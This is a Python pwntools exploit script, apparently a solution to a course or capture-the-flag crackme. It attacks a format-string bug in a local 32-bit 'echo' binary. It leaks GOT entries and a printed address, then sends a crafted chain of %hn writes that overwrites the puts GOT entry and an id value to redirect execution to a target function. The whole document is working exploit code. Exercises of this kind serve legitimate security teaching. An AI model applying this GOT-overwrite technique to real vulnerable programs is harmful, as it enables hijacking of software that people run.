from pwn import *
import code

context(arch='i386', os='linux', log_level='INFO')

p = None

sleep_time = 0.1


def start():
    global p
    p = process('crackme/01_fmt32/echo')
    sleep(sleep_time)
    p.recvuntil('You can exactly 256 charecters ...\n')


def end():
    global p
    p.recv()
    # print(p.recv(numb=0xffff))
    sleep(sleep_time)
    p.close()


def switch():
    end()
    print('-' * 80)
    start()


binary = ELF("crackme/01_fmt32/echo")
puts_got = binary.got['puts']
tar_func_got = binary.got['target_function_3180103012']
log.info('puts got: 0x%x' % puts_got)
log.info('target got: 0x%x' % tar_func_got)

# context.log_level = 'DEBUG'
# start()
# p.send(p32(puts_got) + b'%7$s' + b'.\0')
# switch()
# p.send(p32(tar_func_got) + b'%7$s' + b'.\0')
# end()

p = process('crackme/01_fmt32/echo')
id_addr = int(p.recvuntil('\n')[-9:-1], 16)
log.info('id address: 0x%x' % id_addr)
p.recvuntil('You can exactly 256 charecters ...\n')

# context.log_level = 'DEBUG'
# start()
# p.send(p32(id_addr) + b'%7$s' + b'.\0')
# end()

context.log_level = 'DEBUG'

# p.send(p32(puts_got + 2) + b'@@@@' + p32(puts_got) + b'%.8x' * 5 + b'%.2000x%hn' + b'%.35330x%hn' + b'\0')
p.send(p32(puts_got + 2) + b'@@@@' + p32(id_addr) + b'@@@@' + p32(puts_got) + b'@@@@' + p32(id_addr + 2) + b'%.8x' * 5 + b'%.1984x%hn' + b'%.32096x%hn' + b'%.3234x%hn' + b'%.11142x%hn' + b'\0')

# p.recvuntil('Try harder\n')
p.recvuntil('3180103012\n')
# code.interact(local=locals())

p.close()